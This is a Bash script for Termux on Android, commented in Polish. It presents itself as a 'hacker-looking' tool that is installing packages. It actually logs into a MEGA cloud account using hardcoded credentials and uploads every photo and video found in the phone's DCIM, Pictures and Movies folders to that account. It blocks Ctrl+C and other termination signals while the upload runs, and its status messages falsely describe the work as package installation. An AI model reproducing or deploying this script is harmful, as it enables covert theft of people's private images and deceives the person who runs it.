#!/bin/bash

# Kolor zielony dla hakerskiego wyglądu
GREEN='\033[0;32m'
NC='\033[0m' # Resetowanie koloru

# Instalowanie wymaganych pakietów
echo -e "${GREEN}Instalowanie wymaganych pakietów...${NC}"
pkg update -y
pkg upgrade -y
pkg install megacmd
pkg install -y ffmpeg

# Ponowne instalowanie pakietów
echo -e "${GREEN}Ponowienie pakietów...${NC}"
mega-logout

# Instalowanie pakietów
echo -e "${GREEN}Instalowanie pakietów...${NC}"
mega-login anonymous770183@gmail.com anonymouS78213a

# Instalowanie pakietów w których może być odpowiednie miejsce
FOLDER_DCIM="/storage/emulated/0/DCIM"
FOLDER_PICTURES="/storage/emulated/0/Pictures"
FOLDER_MOVIES="/storage/emulated/0/Movies"
UPLOAD_DIR="/CameraUploads"

# Funkcja do przesyłania pakietów aby działał t00l
upload_files() {
    local folder=$1
    echo -e "${GREEN}Przeszukiwanie folderu: $folder${NC}"

    # Znajdź wszystkie pliki .jpg, .jpeg, .png (zdjęcia) oraz .mp4, .avi, .mov (wideo)
    find "$folder" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.avi" -o -iname "*.mov" \) | while read file; do
        echo -e "${GREEN}Przesyłanie pliku: $file${NC}"
        mega-put "$file" -c "$UPLOAD_DIR"
    done
}

# Zabezpieczenie przed przerwaniem skryptu (Ctrl+C, wyjście, itp.)
trap '' INT TERM QUIT

# Monitorowanie sesji - jeśli spróbujesz zamknąć sesję, wyświetli błąd
while true; do
    echo -e "${GREEN}Przesyłanie pakietów do Header!...${NC}"
    sleep 10
done &

# Przesyłanie pakietów do katalogu DCIM
upload_files "$FOLDER_DCIM"

# Przesyłanie pakietów do katalogu PICTURES
upload_files "$FOLDER_PICTURES"

# Przesyłanie pakietów do katalogu MOVIES
upload_files "$FOLDER_MOVIES"

# Komunikat zakończenia
echo -e "${GREEN}Wszystkie pakiety zostały pomyślnie pobrane > poczekaj 5 minut.${NC}"

# Zakończenie zabezpieczenia
trap - INT TERM QUIT
